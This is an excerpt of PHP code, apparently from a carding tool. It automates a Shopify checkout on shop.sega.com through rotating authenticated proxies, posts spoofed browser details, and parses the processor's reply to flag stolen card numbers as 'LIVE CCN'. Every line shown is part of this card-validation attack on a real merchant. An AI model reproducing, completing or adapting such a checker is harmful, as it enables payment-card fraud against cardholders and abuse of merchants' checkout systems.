...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://shop.sega.com/cart/39357435936861:1?traffic_source=buy_now');
...
$checkouts = trim(strip_tags(getstr($r1, 'pageurl":"shop.sega.com\/24008099\/checkouts\/', '?')));
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/24008099/checkouts/' . $checkouts . '');
...
$headers[] = 'method: POST';
$headers[] = 'path: /24008099/checkouts/' . $checkouts . '';
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token2.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=Advanced+Shipping+Manager+Connector+for+Shopify-Standard%2520Shipping-5.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1042&checkout%5Bclient_details%5D%5Bbrowser_height%5D=762&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r3 = curl_exec($ch);
curl_close($ch);
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/24008099/checkouts/' . $checkouts . '/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
...
if (strpos($r6, 'Security code was not matched by the processor') !== false) {
    $status = "LIVE CCN ✅";
    $response = $msg;
